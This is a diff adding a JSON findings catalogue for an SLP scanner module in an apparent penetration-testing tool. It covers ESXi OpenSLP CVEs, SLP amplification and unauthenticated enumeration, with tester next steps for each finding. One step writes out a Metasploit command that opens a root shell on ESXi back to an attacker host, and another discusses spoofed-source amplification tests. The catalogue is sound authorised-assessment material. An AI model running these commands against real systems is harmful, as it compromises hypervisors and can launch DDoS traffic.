@@ -1,0 +1,185 @@
+{
+  "service": "slp",
+  "module_files": [
+    "recce/services/slp.py"
+  ],
+  "summary": "Rich T1 module with build-gated CVE detection (rare and correct: no CVE claim when version can't be parsed). The ESXi OpenSLP RCE flag is the highest-value promotion target (already publishes 3 CVEs). SLP amplifier is a KEV finding, always flagged when 427/udp responds. Missing: no probe-side ESXi RCE PoC (MSF module referenced only in comments/runbook \u2014 correct default given destructive nature). Multicast sweep is deferred as documented.",
+  "proposed_shared_surface_consumers": [
+    "known_hosts",
+    "known_hostnames",
+    "os_fingerprints",
+    "vmware_esxi_targets"
+  ],
+  "findings": [
+    {
+      "kind": "slp_reachable",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "SLP endpoint reachable (SLPv2 SrvTypeRqst answered)",
+      "tier_evidence": "Reachability only.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Signal only \u2014 the meaningful findings are the ones below.",
+      "related_cves": [],
+      "tester_next_step": "slptool -u <ip> findsrvtypes."
+    },
+    {
+      "kind": "slp_service_catalogue",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "SLP service catalogue readable unauthenticated",
+      "tier_evidence": "SrvTypeRqst returned actual types \u2014 deterministic unauth read.",
+      "can_promote_to": "t2",
+      "promotion_risk": "none",
+      "promotion_notes": "Auto-feed enumerated service types + URLs into cross-service scanners (HTTP/IPP/SMB/NFS/LDAP/wbem/cimom) as new scan targets \u2014 turns the catalogue into free discovery.",
+      "related_cves": [],
+      "tester_next_step": "slptool -u <ip> findsrvtypes; for each type: slptool -u <ip> findsrvs <type>; feed URLs into nmap -sV -Pn <extracted_urls>."
+    },
+    {
+      "kind": "slp_url_disclosure",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "SLP URL enumeration discloses service endpoints",
+      "tier_evidence": "SrvRqst URLs returned and parsed.",
+      "can_promote_to": "t2",
+      "promotion_risk": "none",
+      "promotion_notes": "Same as slp_service_catalogue \u2014 auto-target the URLs downstream.",
+      "related_cves": [],
+      "tester_next_step": "slptool -u <ip> findsrvs service:service-agent; parse each URL and enqueue for the matching service module (HTTP/CIFS/NFS/etc.)."
+    },
+    {
+      "kind": "slp_attribute_disclosure",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "SLP AttrRqst discloses per-service attributes unauthenticated",
+      "tier_evidence": "AttrRqst returned attribute tuples per URL.",
+      "can_promote_to": "t2",
+      "promotion_risk": "none",
+      "promotion_notes": "Grep attribute values for cleartext secrets (managementserver credentials, uuid tokens); feed product/version into os_fingerprints shared surface for exploit selection.",
+      "related_cves": [],
+      "tester_next_step": "slptool -u <ip> findattrs service:VMwareInfrastructure  # look for uuid, managementserver, product, version, build."
+    },
+    {
+      "kind": "slp_amplifier",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "SLP UDP amplification reflector (CVE-2023-29552, KEV)",
+      "tier_evidence": "Any 427/udp responder answering AttrRqst qualifies \u2014 deterministic by protocol behaviour.",
+      "can_promote_to": "t2",
+      "promotion_risk": "medium",
+      "promotion_notes": "Add measured BAF (spoofed source PoC \u2014 send minimal request, measure returned payload) \u2014 must be gated to lab targets since real spoofed egress = DDoS launch. Better: measure req-vs-response byte ratio non-spoofed for reporting.",
+      "related_cves": [
+        "CVE-2023-29552"
+      ],
+      "tester_next_step": "nmap -sU -p427 --script slp-info <ip> | grep -A2 'response'; measured BAF = response_bytes / 82. Do NOT test spoofed egress off-lab."
+    },
+    {
+      "kind": "slp_directory_agent",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "SLP Directory Agent identified (aggregates network SAs)",
+      "tier_evidence": "Discovery \u2014 DA URL advertised.",
+      "can_promote_to": "t1",
+      "promotion_risk": "none",
+      "promotion_notes": "Query the DA with a broad SrvRqst to pull every SA in the scope; DA aggregation multiplies disclosure surface.",
+      "related_cves": [],
+      "tester_next_step": "slptool -u <da_ip> findsrvs service:  # empty type = all SAs registered with the DA."
+    },
+    {
+      "kind": "slp_esxi_openslp_rce",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "VMware ESXi OpenSLP pre-auth RCE \u2014 build-gated (CVE-2021-21974)",
+      "tier_evidence": "Build number parsed from AttrRqst reply and compared against fix build \u2014 deterministic version-gated CVE match, not a banner guess.",
+      "can_promote_to": "t3",
+      "promotion_risk": "destructive",
+      "promotion_notes": "T3 = actual MSF exploit/multi/vmware/openslp_heap_overflow drops a shell as root on ESXi \u2014 destructive class (may crash hostd or the OpenSLP daemon; production ESXi = tenant impact). Only under strict --exploit flag with operator ROE confirmation.",
+      "related_cves": [
+        "CVE-2021-21974",
+        "CVE-2019-5544",
+        "CVE-2020-3992"
+      ],
+      "tester_next_step": "msfconsole -q -x 'use exploit/multi/vmware/openslp_heap_overflow; set RHOSTS <ip>; set LHOST <attacker>; run'  # root RCE; do NOT run without ROE. Also: python PoC gists exist for CVE-2019-5544."
+    },
+    {
+      "kind": "slp_esxi_unknown_build",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "ESXi / WBEM URL advertised via SLP \u2014 review for OpenSLP RCE",
+      "tier_evidence": "Product string present but build not parseable \u2014 class flag, no CVE assertion.",
+      "can_promote_to": "t1",
+      "promotion_risk": "none",
+      "promotion_notes": "Add a second AttrRqst variant (specific tag list) that some ESXi builds return the version in; or curl https://<ip>/ui/ (redirect banner) for out-of-band build. Then the base check can promote to slp_esxi_openslp_rce automatically.",
+      "related_cves": [
+        "CVE-2021-21974",
+        "CVE-2019-5544",
+        "CVE-2020-3992"
+      ],
+      "tester_next_step": "curl -sk https://<ip>/ui/ | grep -oE 'ESXi [0-9.]+'  # front-end sometimes carries the version; then compare against VMSA-2021-0002."
+    },
+    {
+      "kind": "slp_esxi_patched",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "ESXi build advertised via SLP appears patched",
+      "tier_evidence": "Version gate cleared \u2014 informational only.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "None \u2014 reassurance signal.",
+      "related_cves": [],
+      "tester_next_step": "Continue restricting SLP to management network."
+    },
+    {
+      "kind": "slp_scope_disclosure",
+      "tier": "t0",
+      "severity": "low",
+      "title_pattern": "SLP scope tags disclose environment structure",
+      "tier_evidence": "Fingerprint \u2014 scope names extracted.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Informational.",
+      "related_cves": [],
+      "tester_next_step": "slptool -u <ip> findscopes."
+    },
+    {
+      "kind": "slp_auth_present",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "SLP authentication blocks observed in replies",
+      "tier_evidence": "Reassurance \u2014 reply carries auth blocks.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "None \u2014 hardened-deployment signal.",
+      "related_cves": [],
+      "tester_next_step": "No action."
+    },
+    {
+      "kind": "slp_no_auth",
+      "tier": "t1",
+      "severity": "low",
+      "title_pattern": "SLP replies carry no authentication blocks",
+      "tier_evidence": "Confirmed absence \u2014 every reply parsed, none carried auth blocks.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Already correctly reported; pairs with disclosure findings.",
+      "related_cves": [],
+      "tester_next_step": "Restrict SLP to trusted networks."
+    },
+    {
+      "kind": "slp_openslp_fingerprint",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "OpenSLP implementation fingerprinted",
+      "tier_evidence": "Substring match in attribute strings \u2014 pure fingerprint.",
+      "can_promote_to": "t1",
+      "promotion_risk": "none",
+      "promotion_notes": "Feed OpenSLP version (if parseable) into a CVE gate matching ESXi/OpenSLP advisory line (adds T1 without new probes).",
+      "related_cves": [
+        "CVE-2019-5544",
+        "CVE-2020-3992",
+        "CVE-2021-21974"
+      ],
+      "tester_next_step": "slptool -u <ip> findattrs service:service-agent  # grep for version; compare to OpenSLP release notes."
+    }
+  ]
+}
